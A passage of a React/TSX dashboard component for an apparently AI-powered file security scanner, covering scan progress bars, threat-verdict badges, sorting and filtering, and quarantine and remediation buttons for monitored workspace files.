                  : "text-[#8E8E93] hover:text-white"
              }`}
            >
              <SlidersHorizontal className="w-3.5 h-3.5" />
              <span>Table View</span>
            </button>
            <button
              onClick={() => {
                setDisplayMode("explorer");
                if (categoryFilter === "QUARANTINED") setCategoryFilter("ALL");
                fetchExplorerData(explorerPath);
              }}
              className={`px-3 py-1.5 rounded-lg text-xs font-semibold flex items-center gap-1.5 transition-all apple-button ${
                displayMode === "explorer"
                  ? "bg-blue-600 text-white shadow-sm shadow-blue-500/20"
                  : "text-[#8E8E93] hover:text-white"
              }`}
            >
              <Folder className="w-3.5 h-3.5 text-blue-300" />
              <span>Explorer View</span>
            </button>
            <button
              onClick={() => {
                setDisplayMode("quarantine");
                setCategoryFilter("QUARANTINED");
                fetchQuarantinedFiles();
              }}
              className={`px-3 py-1.5 rounded-lg text-xs font-semibold flex items-center gap-1.5 transition-all apple-button ${
                displayMode === "quarantine"
                  ? "bg-amber-600 text-white shadow-sm shadow-amber-500/30"
                  : "text-amber-400/90 hover:text-amber-300"
              }`}
            >
              <Lock className="w-3.5 h-3.5 text-amber-300" />
              <span>Quarantined ({quarantinedFiles.length})</span>
            </button>
          </div>

          {/* "+ Add File to Workspace" Button (User asked for live file additions) */}
          <button
            onClick={() => setShowCreateModal(true)}
            className="px-3.5 py-1.5 rounded-xl bg-blue-600 hover:bg-blue-500 text-white font-semibold text-xs flex items-center gap-1.5 apple-button shadow-sm"
          >
            <Plus className="w-3.5 h-3.5" />
            <span>Add File</span>
          </button>

          {/* INITIAL SYSTEM SCAN ON ALL FILES (User explicitly asked: option named as System scan) */}
          {isBatchScanning ? (
            <button
              onClick={handleStopSequentialScan}
              className="px-3.5 py-1.5 rounded-xl bg-rose-600/20 hover:bg-rose-600/30 text-rose-300 border border-rose-500/40 text-xs font-semibold flex items-center gap-1.5 apple-button"
            >
              <Pause className="w-3.5 h-3.5" />
              <span>Stop Scan</span>
            </button>
          ) : (
            <button
              onClick={handleStartSystemScan}
              className="px-3.5 py-1.5 rounded-xl bg-gradient-to-r from-blue-600 to-indigo-600 hover:from-blue-500 hover:to-indigo-500 text-white font-semibold text-xs flex items-center gap-1.5 apple-button shadow-md shadow-blue-500/20"
              title="Perform Initial System Scan on all workspace files"
            >
              <ShieldCheck className="w-3.5 h-3.5 text-white" />
              <span>System Scan</span>
            </button>
          )}

          {/* Refresh files list */}
          <button
            onClick={() => {
              if (displayMode === "explorer") {
                fetchExplorerData(explorerPath);
              } else {
                fetchWorkspaceFiles();
              }
            }}
            disabled={isLoadingFiles || isLoadingExplorer}
            className="p-2 rounded-xl bg-white/[0.04] hover:bg-white/[0.08] border border-white/[0.08] text-[#8E8E93] hover:text-white transition-all apple-button"
            title="Refresh File List / Directory"
          >
            <RefreshCw className={`w-4 h-4 ${isLoadingFiles || isLoadingExplorer ? "animate-spin text-blue-400" : ""}`} />
          </button>
        </div>
      </div>

      {/* MODEL ARCHITECTURAL COMPARISON DRAWER */}
      {showModelComparison && (
        <motion.div
          initial={{ opacity: 0, height: 0 }}
          animate={{ opacity: 1, height: "auto" }}
          exit={{ opacity: 0, height: 0 }}
          className="apple-panel p-5 border border-blue-500/30 space-y-3 text-xs"
        >
          <div className="flex items-center justify-between border-b border-white/[0.08] pb-2.5">
            <div className="flex items-center gap-2">
              <Sparkles className="w-4 h-4 text-blue-400" />
              <span className="font-semibold text-white">
                Architectural Evaluation: Verified Top-Tier Production Models on Groq
              </span>
            </div>
            <button
              onClick={() => setShowModelComparison(false)}
              className="p-1 rounded-lg hover:bg-white/[0.08] text-[#8E8E93] hover:text-white"
            >
              <X className="w-4 h-4" />
            </button>
          </div>

          <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
            <div className={`p-4 rounded-xl border ${
              selectedModel === "openai/gpt-oss-120b"
                ? "bg-blue-500/[0.08] border-blue-500/40 ring-1 ring-blue-500/30"
                : "bg-white/[0.02] border-white/[0.06]"
            }`}>
              <div className="flex items-center justify-between mb-1.5">
                <span className="font-semibold text-blue-300 text-xs">GPT-OSS 120B Flagship</span>
                <span className="text-[9px] px-1.5 py-0.2 rounded-full bg-blue-500/20 text-blue-300 font-mono">
                  120B Flagship
                </span>
              </div>
              <p className="text-[#8E8E93] text-[11px] leading-relaxed">
                Groq Flagship 120B parameter foundation model with 131k context. Excels at multi-stage threat correlation, killchain mapping, and end-to-end incident mitigation playbooks.
              </p>
              <button
                onClick={() => setSelectedModel("openai/gpt-oss-120b")}
                className="mt-3 text-[11px] font-semibold text-blue-400 hover:text-blue-300 flex items-center gap-1"
              >
                <span>Select 120B Flagship</span>
                <ChevronRight className="w-3 h-3" />
              </button>
            </div>

            <div className={`p-4 rounded-xl border ${
              selectedModel === "openai/gpt-oss-20b"
                ? "bg-purple-500/[0.08] border-purple-500/40 ring-1 ring-purple-500/30"
                : "bg-white/[0.02] border-white/[0.06]"
            }`}>
              <div className="flex items-center justify-between mb-1.5">
                <span className="font-semibold text-purple-300 text-xs">GPT-OSS 20B High-Speed</span>
                <span className="text-[9px] px-1.5 py-0.2 rounded-full bg-purple-500/20 text-purple-300 font-mono">
                  20B Fast
                </span>
              </div>
              <p className="text-[#8E8E93] text-[11px] leading-relaxed">
                High-throughput 20B reasoning model on Groq LPU. Optimal for sub-second live file monitoring, rapid IOC triage, AST deobfuscation, and immediate verdicts.
              </p>
              <button
                onClick={() => setSelectedModel("openai/gpt-oss-20b")}
                className="mt-3 text-[11px] font-semibold text-purple-400 hover:text-purple-300 flex items-center gap-1"
              >
                <span>Select 20B Fast</span>
                <ChevronRight className="w-3 h-3" />
              </button>
            </div>

            <div className={`p-4 rounded-xl border ${
              selectedModel === "openai/gpt-oss-safeguard-20b"
                ? "bg-amber-500/[0.08] border-amber-500/40 ring-1 ring-amber-500/30"
                : "bg-white/[0.02] border-white/[0.06]"
            }`}>
              <div className="flex items-center justify-between mb-1.5">
                <span className="font-semibold text-amber-300 text-xs">GPT-OSS Safeguard 20B</span>
                <span className="text-[9px] px-1.5 py-0.2 rounded-full bg-amber-500/20 text-amber-300 font-mono">
                  Policy Guard
                </span>
              </div>
              <p className="text-[#8E8E93] text-[11px] leading-relaxed">
                Dedicated Groq cybersecurity policy & safety classifier. Specialized in zero-trust policy enforcement, automated quarantine decisions, and safeguard gating.
              </p>
              <button
                onClick={() => setSelectedModel("openai/gpt-oss-safeguard-20b")}
                className="mt-3 text-[11px] font-semibold text-amber-400 hover:text-amber-300 flex items-center gap-1"
              >
                <span>Select Policy Guard</span>
                <ChevronRight className="w-3 h-3" />
              </button>
            </div>
          </div>
        </motion.div>
      )}

      {/* REAL-TIME ETA PROGRESS BAR: BATCH SYSTEM SCAN */}
      {isBatchScanning && (
        <RealtimeETAProgressBar
          title="Initial System Scan & Groq LPU Classification"
          subtitle={scanProgress ? `Scanning file ${scanProgress.current}/${scanProgress.total}: ${scanProgress.currentFileName}` : `Streaming workspace payloads to ${selectedModel.split("/").pop()}...`}
          isActive={isBatchScanning}
          currentStep={scanProgress?.current}
          totalSteps={scanProgress?.total || files.length}
          progressPercent={scanProgress ? Math.round((scanProgress.current / scanProgress.total) * 100) : undefined}
          estimatedDurationMs={Math.max(3000, files.length * 400)}
          onCancel={handleStopSequentialScan}
          accentColor="blue"
          stages={[
            { label: "Stage 1/4: Ingesting Raw Workspace Payloads & AST Tokenization", targetPercent: 0 },
            { label: "Stage 2/4: Computing Shannon Entropy & Heuristic Signature Matching", targetPercent: 25 },
            { label: "Stage 3/4: Groq LPU Zero-Trust Inference & Anomaly Classification", targetPercent: 60 },
            { label: "Stage 4/4: Synchronizing Risk Index & SQLite Audit Catalog", targetPercent: 88 }
          ]}
        />
      )}

      {/* REAL-TIME ETA PROGRESS BAR: SINGLE FILE DEEP SCAN */}
      {activeSingleScanFile && !isBatchScanning && (
        <RealtimeETAProgressBar
          title="Groq LPU Deep File Analysis"
          subtitle={`Classifying ${activeSingleScanFile.filename} with ${selectedModel.split("/").pop()}...`}
          isActive={Boolean(activeSingleScanFile)}
          estimatedDurationMs={2400}
          accentColor="purple"
          stages={[
            { label: "Stage 1/4: Reading Byte Stream & Parsing File Syntax", targetPercent: 0 },
            { label: "Stage 2/4: Calculating Shannon Entropy & Security Heuristics", targetPercent: 28 },
            { label: "Stage 3/4: High-Speed Groq Inference & Confidence Scoring", targetPercent: 65 },
            { label: "Stage 4/4: Formatting Structured Threat Verdict & Remediation Rules", targetPercent: 88 }
          ]}
        />
      )}

      {/* REAL-TIME ETA PROGRESS BAR: QUARANTINED FORENSIC RE-SCAN */}
      {activeDeepScanQuarantined && (
        <RealtimeETAProgressBar
          title="Quarantined Enclave Forensic Re-Scan"
          subtitle={`Deep static & symbolic decompilation of ${activeDeepScanQuarantined.filename}...`}
          isActive={Boolean(activeDeepScanQuarantined)}
          estimatedDurationMs={2600}
          accentColor="amber"
          stages={[
            { label: "Stage 1/4: Reading Defused chmod 000 Artifact from Enclave", targetPercent: 0 },
            { label: "Stage 2/4: Evaluating Byte Hex Distribution & Packing Indicators", targetPercent: 25 },
            { label: "Stage 3/4: Groq LPU Reverse Engineering & MITRE ATT&CK Mapping", targetPercent: 62 },
            { label: "Stage 4/4: Synthesizing Incident Attribution & Containment Report", targetPercent: 88 }
          ]}
        />
      )}

      {/* REAL-TIME ETA PROGRESS BAR: SAST AUTO-PATCH REMEDIATION */}
      {isApplyingRemediation && (
        <RealtimeETAProgressBar
          title="SAST Vulnerability Remediation & Code Patching"
          subtitle="Synthesizing secure code pattern and applying hot patch to workspace..."
          isActive={isApplyingRemediation}
          estimatedDurationMs={1800}
          accentColor="emerald"
          stages={[
            { label: "Stage 1/3: Parsing Abstract Syntax Tree & Line Flaw", targetPercent: 0 },
            { label: "Stage 2/3: Applying Parameterized Safe Query / Sanitized Subprocess", targetPercent: 40 },
            { label: "Stage 3/3: Re-compiling Code & Verifying Post-Patch Integrity", targetPercent: 80 }
          ]}
        />
      )}

      {/* =================================================================== */}
      {/* SUMMARY STATS STRIP                                                 */}
      {/* =================================================================== */}
      <div className="grid grid-cols-2 sm:grid-cols-5 gap-3 text-xs">
        <div className="apple-panel p-3.5 flex items-center justify-between">
          <div>
            <span className="text-[10px] text-[#8E8E93] uppercase font-semibold">Total Files</span>
            <div className="text-xl font-semibold text-white mt-0.5">{files.length}</div>
          </div>
          <FolderOpen className="w-4 h-4 text-blue-400" />
        </div>

        <div className="apple-panel p-3.5 flex items-center justify-between">
          <div>
            <span className="text-[10px] text-[#8E8E93] uppercase font-semibold">Unsafe Threats</span>
            <div className="text-xl font-semibold text-rose-400 mt-0.5">{unsafeCount}</div>
          </div>
          <ShieldAlert className="w-4 h-4 text-rose-400" />
        </div>

        <div className="apple-panel p-3.5 flex items-center justify-between">
          <div>
            <span className="text-[10px] text-[#8E8E93] uppercase font-semibold">Vulnerable Code</span>
            <div className="text-xl font-semibold text-amber-400 mt-0.5">{vulnerableCount}</div>
          </div>
          <AlertCircle className="w-4 h-4 text-amber-400" />
        </div>

        <div className="apple-panel p-3.5 flex items-center justify-between">
          <div>
            <span className="text-[10px] text-[#8E8E93] uppercase font-semibold">Safe / Clean</span>
            <div className="text-xl font-semibold text-emerald-400 mt-0.5">{safeCount}</div>
          </div>
          <ShieldCheck className="w-4 h-4 text-emerald-400" />
        </div>

        <div className="apple-panel p-3.5 flex items-center justify-between">
          <div>
            <span className="text-[10px] text-[#8E8E93] uppercase font-semibold">Pending</span>
            <div className="text-xl font-semibold text-slate-400 mt-0.5">{pendingCount}</div>
          </div>
          <FileQuestion className="w-4 h-4 text-slate-400" />
        </div>
      </div>

      {/* =================================================================== */}
      {/* FILE EXPLORER SEARCH, CATEGORY FILTER & SORT CONTROLS               */}
      {/* =================================================================== */}
      <div className="flex flex-col md:flex-row items-stretch md:items-center justify-between gap-3 text-xs">
        <div className="flex flex-wrap items-center gap-2.5 flex-1">
          <div className="relative w-full sm:w-72">
            <Search className="w-3.5 h-3.5 text-[#8E8E93] absolute left-3 top-2.5" />
            <input
              type="text"
              value={searchFilter}
              onChange={(e) => setSearchFilter(e.target.value)}
              placeholder="Search files by name or vulnerability..."
              className="w-full pl-9 pr-3 py-1.5 rounded-xl bg-white/[0.035] border border-white/[0.08] text-white placeholder-[#636366] text-xs focus:outline-none focus:border-blue-500/50"
            />
          </div>

          <div className="flex items-center gap-1 overflow-x-auto">
            {(["ALL", "UNSAFE", "VULNERABLE", "SAFE", "PENDING", "QUARANTINED"] as const).map((cat) => (
              <button
                key={cat}
                onClick={() => {
                  setCategoryFilter(cat);
                  if (cat === "QUARANTINED") {
                    setDisplayMode("quarantine");
                    fetchQuarantinedFiles();
                  } else if (displayMode === "quarantine") {
                    setDisplayMode("table");
                  }
                }}
                className={`px-3 py-1 rounded-xl text-[11px] font-medium transition-all ${
                  categoryFilter === cat || (cat === "QUARANTINED" && displayMode === "quarantine")
                    ? "bg-white/[0.1] text-white border border-white/[0.12] shadow-sm"
                    : "text-[#8E8E93] hover:text-white hover:bg-white/[0.04]"
                }`}
              >
                {cat === "ALL" ? `All (${files.length})` :
                 cat === "UNSAFE" ? `Unsafe Threats (${unsafeCount})` :
                 cat === "VULNERABLE" ? `Vulnerable Code (${vulnerableCount})` :
                 cat === "SAFE" ? `Safe (${safeCount})` :
                 cat === "PENDING" ? `Pending (${pendingCount})` :
                 `Quarantined (${quarantinedFiles.length})`}
              </button>
            ))}
          </div>
        </div>

        {/* SORT SELECTOR DROPDOWN (User requirement: Sort files by name, date modified, etc.) */}
        <div className="flex items-center gap-2 self-end md:self-auto">
          <div className="flex items-center gap-1.5 px-3 py-1.5 rounded-xl bg-white/[0.035] border border-white/[0.08] text-xs">
            <ArrowUpDown className="w-3.5 h-3.5 text-blue-400" />
            <span className="text-[#8E8E93] text-[11px] font-medium">Sort by:</span>
            <select
              value={sortField}
              onChange={(e) => setSortField(e.target.value as SortField)}
              className="bg-transparent text-white text-xs focus:outline-none cursor-pointer font-medium"
            >
              <option value="verdict" className="bg-[#0D111E]">Threat Verdict</option>
              <option value="risk" className="bg-[#0D111E]">Risk Score</option>
              <option value="name" className="bg-[#0D111E]">File Name</option>
              <option value="modified" className="bg-[#0D111E]">Date Modified</option>
              <option value="size" className="bg-[#0D111E]">File Size</option>
              <option value="entropy" className="bg-[#0D111E]">Entropy</option>
            </select>
            <button
              onClick={() => setSortDirection(prev => prev === "asc" ? "desc" : "asc")}
              className="p-1 rounded-lg hover:bg-white/[0.08] text-[#8E8E93] hover:text-white transition-colors"
              title={`Direction: ${sortDirection.toUpperCase()} (Click to toggle)`}
            >
              {sortDirection === "asc" ? <ChevronUp className="w-3.5 h-3.5 text-blue-400" /> : <ChevronDown className="w-3.5 h-3.5 text-blue-400" />}
            </button>
          </div>
        </div>
      </div>

      {/* =================================================================== */}
      {/* MAIN VIEW: TABLE VIEW VS HIERARCHICAL SANDBOXED EXPLORER VIEW        */}
      {/* =================================================================== */}
      <div className="grid grid-cols-1 lg:grid-cols-12 gap-6">
        {/* LEFT / MAIN PANE */}
        <div className={`${(selectedFile && displayMode !== "quarantine") ? "lg:col-span-7" : "lg:col-span-12"} apple-panel flex flex-col min-h-[520px] border border-white/[0.08] overflow-hidden`}>
          {displayMode === "table" ? (
            /* ============================================================= */
            /* MODE A: FLAT TABLE VIEW WITH COLUMN-BASED CLICKABLE SORTING   */
            /* ============================================================= */
            <>
              {/* Table Header Bar */}
              <div className="p-3.5 px-4 border-b border-white/[0.07] bg-white/[0.02] flex items-center justify-between text-xs">
                <div className="flex items-center gap-2 text-[#8E8E93]">
                  <FolderOpen className="w-4 h-4 text-blue-400" />
                  <span className="font-medium text-slate-300">monitored_workspace/</span>
                  <span className="text-[10px] text-slate-500">({sortedFiles.length} files)</span>
                </div>
                <div className="text-[10px] text-[#8E8E93] flex items-center gap-2">
                  <span>Click column headers to sort • Right-click for actions</span>
                </div>
              </div>

              {/* Clickable Sort Column Headers */}
              <div className="grid grid-cols-12 gap-2 px-4 py-2.5 bg-white/[0.015] border-b border-white/[0.06] text-[10px] font-semibold text-[#8E8E93] uppercase tracking-wider select-none">
                <div
                  onClick={() => handleToggleSort("name")}
                  className="col-span-6 flex items-center gap-1 cursor-pointer hover:text-white transition-colors"
                  title="Sort by File Name"
                >
                  <span>File Name</span>
                  {sortField === "name" ? (
                    sortDirection === "asc" ? <ChevronUp className="w-3 h-3 text-blue-400" /> : <ChevronDown className="w-3 h-3 text-blue-400" />
                  ) : <ArrowUpDown className="w-2.5 h-2.5 text-slate-600" />}
                </div>

                <div
                  onClick={() => handleToggleSort("modified")}
                  className="col-span-2 hidden md:flex items-center gap-1 cursor-pointer hover:text-white transition-colors"
                  title="Sort by Date Modified"
                >
                  <span>Modified</span>
                  {sortField === "modified" ? (
                    sortDirection === "asc" ? <ChevronUp className="w-3 h-3 text-blue-400" /> : <ChevronDown className="w-3 h-3 text-blue-400" />
                  ) : <ArrowUpDown className="w-2.5 h-2.5 text-slate-600" />}
                </div>

                <div
                  onClick={() => handleToggleSort("size")}
                  className="col-span-1 hidden lg:flex items-center gap-1 cursor-pointer hover:text-white transition-colors"
                  title="Sort by File Size"
                >
                  <span>Size</span>
                  {sortField === "size" ? (
                    sortDirection === "asc" ? <ChevronUp className="w-3 h-3 text-blue-400" /> : <ChevronDown className="w-3 h-3 text-blue-400" />
                  ) : <ArrowUpDown className="w-2.5 h-2.5 text-slate-600" />}
                </div>

                <div
                  onClick={() => handleToggleSort("entropy")}
                  className="col-span-1 hidden xl:flex items-center gap-1 cursor-pointer hover:text-white transition-colors"
                  title="Sort by Shannon Entropy"
                >
                  <span>Entropy</span>
                  {sortField === "entropy" ? (
                    sortDirection === "asc" ? <ChevronUp className="w-3 h-3 text-blue-400" /> : <ChevronDown className="w-3 h-3 text-blue-400" />
                  ) : <ArrowUpDown className="w-2.5 h-2.5 text-slate-600" />}
                </div>

                <div
                  onClick={() => handleToggleSort("verdict")}
                  className="col-span-6 md:col-span-4 lg:col-span-3 xl:col-span-2 flex items-center justify-end gap-1 cursor-pointer hover:text-white transition-colors text-right"
                  title="Sort by AI Threat Verdict"
                >
                  <span>AI Verdict</span>
                  {sortField === "verdict" ? (
                    sortDirection === "asc" ? <ChevronUp className="w-3 h-3 text-blue-400" /> : <ChevronDown className="w-3 h-3 text-blue-400" />
                  ) : <ArrowUpDown className="w-2.5 h-2.5 text-slate-600" />}
                </div>
              </div>

              {/* Files Table Rows */}
              <div className="flex-1 overflow-y-auto divide-y divide-white/[0.04] text-xs">
                {sortedFiles.length === 0 ? (
                  <div className="py-16 text-center text-[#8E8E93] text-xs space-y-2">
                    <FileCode2 className="w-8 h-8 text-slate-600 mx-auto" />
                    <p className="text-white font-medium">No files found matching filter</p>
                    <p className="text-[11px] text-[#8E8E93]">Add a file or clear search query to view items.</p>
                  </div>
                ) : (
                  sortedFiles.map((file) => {
                    const Icon = getFileIcon(file.extension);
                    const isSelected = selectedFile?.filepath === file.filepath || selectedFile?.filename === file.filename;
                    const isAnalyzing = file.verdict === "ANALYZING";

                    return (
                      <div
                        key={file.filepath || file.relative_path || file.filename}
                        onClick={() => setSelectedFile(file)}
                        onContextMenu={(e) => handleContextMenu(e, file)}
                        className={`p-3.5 px-4 flex items-center justify-between cursor-pointer transition-all select-none ${
                          isSelected
                            ? "bg-white/[0.08] border-l-2 border-blue-400"
                            : "hover:bg-white/[0.035] border-l-2 border-transparent"
                        } ${isAnalyzing ? "bg-blue-500/[0.05]" : ""}`}
                      >
                        {/* File Icon & Name */}
                        <div className="flex items-center gap-3 min-w-0 flex-1 pr-3">
                          <div className={`w-8 h-8 rounded-lg flex items-center justify-center flex-shrink-0 ${
                            file.verdict === "UNSAFE" ? "bg-rose-500/15 text-rose-400" :
                            file.verdict === "VULNERABLE" ? "bg-amber-500/15 text-amber-400" :
                            file.verdict === "SAFE" ? "bg-emerald-500/15 text-emerald-400" :
                            "bg-white/[0.05] text-[#8E8E93]"
                          }`}>
                            <Icon className="w-4 h-4" />
                          </div>

                          <div className="min-w-0">
                            <div className="flex items-center gap-2">
                              <span className="font-semibold text-white text-xs truncate">
                                {file.filename}
                              </span>
                              {file.relative_path && file.relative_path.includes("/") && (
                                <span className="text-[9px] px-1.5 py-0.2 rounded bg-blue-500/10 text-blue-300 font-mono border border-blue-500/20">
                                  {file.relative_path.substring(0, file.relative_path.lastIndexOf("/"))}
                                </span>
                              )}
                              {file.is_new && (
                                <span className="text-[9px] px-1.5 py-0.2 rounded-full bg-blue-500/20 text-blue-300 font-mono animate-pulse">
                                  NEW
                                </span>
                              )}
                            </div>

                            <div className="text-[10px] text-[#8E8E93] flex items-center gap-2 mt-0.5">
                              <span>{(file.size_bytes / 1024).toFixed(1)} KB</span>
                              <span>•</span>
                              <span>Entropy: {file.entropy}</span>
                              <span className="hidden md:inline">•</span>
                              <span className="hidden md:inline">
                                {new Date(file.modified_at).toLocaleDateString()} {new Date(file.modified_at).toLocaleTimeString([], { hour: "2-digit", minute: "2-digit" })}
                              </span>
                            </div>
                          </div>
                        </div>

                        {/* AI CLASSIFICATION BADGE */}
                        <div className="flex items-center gap-3 flex-shrink-0">
                          {isAnalyzing ? (
                            <span className="inline-flex items-center gap-1.5 text-[10px] px-2.5 py-1 rounded-full bg-blue-500/15 text-blue-300 font-semibold border border-blue-500/30 animate-pulse">
                              <RefreshCw className="w-3 h-3 animate-spin" />
                              <span>Analyzing...</span>
                            </span>
                          ) : file.verdict === "UNSAFE" ? (
                            <div className="flex items-center gap-1.5 flex-wrap justify-end">
                              {/* Harmful Threat Badge with Risk Score */}
                              <span className="inline-flex items-center gap-1.5 text-[10px] px-2.5 py-1 rounded-full bg-rose-500/20 text-rose-300 font-semibold border border-rose-500/35 shadow-sm shadow-rose-950/40">
                                <AlertTriangle className="w-3 h-3 text-rose-400" />
                                <span>UNSAFE • {file.threat_category || "Threat"}</span>
                                {file.risk_score !== undefined && (
                                  <span className="ml-1 px-1.5 py-0.2 rounded-full bg-rose-950/70 text-rose-200 font-mono text-[9px] border border-rose-500/30">
                                    {file.risk_score}/100
                                  </span>
                                )}
                              </span>

                              {/* Quick Action Options on Badge for Harmful File */}
                              <div className="flex items-center gap-1" onClick={(e) => e.stopPropagation()}>
                                {onNavigateToMitigation && (
                                  <button
                                    onClick={() => onNavigateToMitigation({
                                      fileName: file.filename,
                                      filePath: file.filepath,
                                      threatCategory: file.threat_category || "Malware",
                                      severity: file.severity || "HIGH"
                                    })}
                                    className="px-2 py-0.8 rounded-lg bg-amber-500/20 hover:bg-amber-500/30 text-amber-300 border border-amber-500/40 text-[10px] font-semibold flex items-center gap-1 transition-all apple-button"
                                    title="Quick Mitigate: Send to Mitigation Copilot"
                                  >
                                    <Zap className="w-2.5 h-2.5 text-amber-400" />
                                    <span>Mitigate</span>
                                  </button>
                                )}

                                <button
                                  onClick={() => handleQuarantineFile(file)}
                                  className="px-2 py-0.8 rounded-lg bg-rose-600/20 hover:bg-rose-600/30 text-rose-300 border border-rose-500/35 text-[10px] font-semibold flex items-center gap-1 transition-all apple-button"
                                  title="Quick Quarantine: Move to .quarantine/ enclave"
                                >
                                  <Lock className="w-2.5 h-2.5 text-rose-400" />
                                  <span>Quarantine</span>
                                </button>
                              </div>
                            </div>
                          ) : file.verdict === "VULNERABLE" ? (
                            <div className="flex items-center gap-1.5 flex-wrap justify-end">
                              {/* Vulnerable Code Badge */}
                              <span className="inline-flex items-center gap-1.5 text-[10px] px-2.5 py-1 rounded-full bg-amber-500/20 text-amber-300 font-semibold border border-amber-500/35 shadow-sm shadow-amber-950/40">
                                <AlertCircle className="w-3 h-3 text-amber-400" />
                                <span>VULNERABLE • {file.vulnerability_details?.title || file.threat_category || "Code Flaw"}</span>
                                {file.risk_score !== undefined && (
                                  <span className="ml-1 px-1.5 py-0.2 rounded-full bg-amber-950/70 text-amber-200 font-mono text-[9px] border border-amber-500/30">
                                    {file.risk_score}/100
                                  </span>
                                )}
                              </span>

                              {/* Specialized Mitigating Options beside Badge */}
                              <div className="flex items-center gap-1" onClick={(e) => e.stopPropagation()}>
                                <button
                                  onClick={() => handleApplyVulnerabilityRemediation(file, "SPECIALIZED")}
                                  className="px-2 py-0.8 rounded-lg bg-indigo-600/20 hover:bg-indigo-600/30 text-indigo-300 border border-indigo-500/35 text-[10px] font-semibold flex items-center gap-1 transition-all apple-button"
                                  title="Quick Specialized Mitigation: Apply secure pattern"
                                >
                                  <Shield className="w-2.5 h-2.5 text-indigo-400" />
                                  <span>
                                    {file.vulnerability_details?.vulnerability_type === "SQL_INJECTION" ? "Parameterize" :
                                     file.vulnerability_details?.vulnerability_type === "COMMAND_INJECTION" ? "Safe Subprocess" :
                                     file.vulnerability_details?.vulnerability_type === "HARDCODED_SECRET" ? "Move to Env" :
                                     file.vulnerability_details?.vulnerability_type === "PATH_TRAVERSAL" ? "Sanitize Path" :
                                     file.vulnerability_details?.vulnerability_type === "INSECURE_DESERIALIZATION" ? "SafeLoader" : "Patch Flaw"}
                                  </span>
                                </button>

                                <button
                                  onClick={() => setRemediationModal({ visible: true, file, isApplying: false })}
                                  className="px-2 py-0.8 rounded-lg bg-amber-500/20 hover:bg-amber-500/30 text-amber-300 border border-amber-500/40 text-[10px] font-semibold flex items-center gap-1 transition-all apple-button"
                                  title="Inspect Vulnerability & Remediate"
                                >
                                  <Wrench className="w-2.5 h-2.5 text-amber-400" />
                                  <span>Remediate</span>
                                </button>
                              </div>
                            </div>
                          ) : file.verdict === "SAFE" ? (
                            <div className="flex items-center gap-2">
                              <span className="inline-flex items-center gap-1.5 text-[10px] px-2.5 py-1 rounded-full bg-emerald-500/15 text-emerald-400 font-semibold border border-emerald-500/25">
                                <CheckCircle2 className="w-3 h-3 text-emerald-400" />
                                <span>SAFE</span>
                                {file.risk_score !== undefined && (
                                  <span className="ml-1 text-[9px] font-mono text-emerald-500/80">
                                    {file.risk_score}/100
                                  </span>
                                )}
                              </span>
                            </div>
                          ) : (
                            <button
                              onClick={(e) => {
                                e.stopPropagation();
                                analyzeSingleFile(file);
                              }}
                              className="inline-flex items-center gap-1 text-[10px] px-2.5 py-1 rounded-full bg-white/[0.05] hover:bg-white/[0.1] text-[#8E8E93] hover:text-white font-medium border border-white/[0.08] transition-all apple-button"
                              title="Click to analyze with Groq"
                            >
                              <Play className="w-2.5 h-2.5" />
                              <span>Scan</span>
                            </button>
                          )}

                          {/* Right-click menu trigger button */}
                          <button
                            onClick={(e) => handleContextMenu(e, file)}
                            className="p-1 rounded-lg text-[#8E8E93] hover:text-white hover:bg-white/[0.08]"
                            title="File actions"
                          >
                            <MoreVertical className="w-3.5 h-3.5" />
                          </button>
                        </div>
                      </div>
                    );
                  })
                )}
              </div>
            </>
          ) : displayMode === "explorer" ? (
            /* ============================================================= */
            /* MODE B: HIERARCHICAL SANDBOXED FILE EXPLORER VIEW             */
            /* strictly constrained to monitored_workspace/                   */
            /* ============================================================= */
            <>
              {/* Sandboxed Explorer Navigation Bar */}
              <div className="p-3.5 px-4 border-b border-white/[0.07] bg-white/[0.02] flex flex-wrap items-center justify-between gap-3 text-xs">
                {/* Back button & Breadcrumbs */}
                <div className="flex items-center gap-2 flex-1 min-w-0">
                  <button
                    disabled={!explorerData?.can_go_up}
                    onClick={() => fetchExplorerData(explorerData?.parent_path || "")}
                    className="p-1.5 px-2.5 rounded-lg bg-white/[0.05] hover:bg-white/[0.1] disabled:opacity-30 disabled:pointer-events-none flex items-center gap-1 text-xs text-slate-300 transition-all apple-button"
                    title="Go to parent directory"
                  >
                    <ArrowLeft className="w-3.5 h-3.5" />
                    <span className="font-medium text-[11px]">Back</span>
                  </button>

                  {/* Clickable Breadcrumbs Path */}
                  <div className="flex items-center gap-1 text-xs overflow-x-auto py-0.5">
                    <Folder className="w-4 h-4 text-blue-400 flex-shrink-0" />
                    {explorerData?.breadcrumbs ? (
                      explorerData.breadcrumbs.map((crumb, idx) => {
                        const isLast = idx === explorerData.breadcrumbs.length - 1;
                        return (
                          <React.Fragment key={crumb.path || "root"}>
                            <button
                              onClick={() => fetchExplorerData(crumb.path)}
                              className={`px-2 py-0.5 rounded-md transition-colors ${
                                isLast
                                  ? "text-white font-semibold bg-white/[0.06]"
                                  : "text-[#8E8E93] hover:text-white hover:bg-white/[0.04]"
                              }`}
                            >
                              {crumb.name}
                            </button>
                            {!isLast && <ChevronRight className="w-3 h-3 text-[#636366] flex-shrink-0" />}
                          </React.Fragment>
                        );
                      })
                    ) : (
                      <span className="text-[#8E8E93] font-mono">monitored_workspace/</span>
                    )}
                  </div>
                </div>

                {/* Sandbox Lock Indicator & Action Buttons */}
                <div className="flex items-center gap-2">
                  <div
                    className="flex items-center gap-1.5 px-2.5 py-1 rounded-full bg-emerald-500/10 border border-emerald-500/25 text-[10px] text-emerald-400 font-medium"
                    title="Path traversal outside monitored_workspace/ is strictly prohibited by security sandbox"
                  >
                    <Lock className="w-3 h-3 text-emerald-400" />
                    <span>Sandboxed Workspace</span>
                  </div>

                  <button
                    onClick={() => setShowCreateFolderModal(true)}
                    className="px-2.5 py-1 rounded-xl bg-white/[0.05] hover:bg-white/[0.1] border border-white/[0.08] text-xs text-white flex items-center gap-1.5 apple-button"
                    title="Create directory in current path"
                  >
                    <FolderPlus className="w-3.5 h-3.5 text-blue-400" />
                    <span className="text-[11px] font-medium">New Folder</span>
                  </button>

                  <button
                    onClick={() => fetchExplorerData(explorerPath)}
                    disabled={isLoadingExplorer}
                    className="p-1.5 rounded-xl bg-white/[0.04] hover:bg-white/[0.08] text-[#8E8E93] hover:text-white transition-all apple-button"
                    title="Refresh Directory Contents"
                  >
                    <RefreshCw className={`w-3.5 h-3.5 ${isLoadingExplorer ? "animate-spin text-blue-400" : ""}`} />
                  </button>
                </div>
              </div>

              {/* Explorer Content Body */}
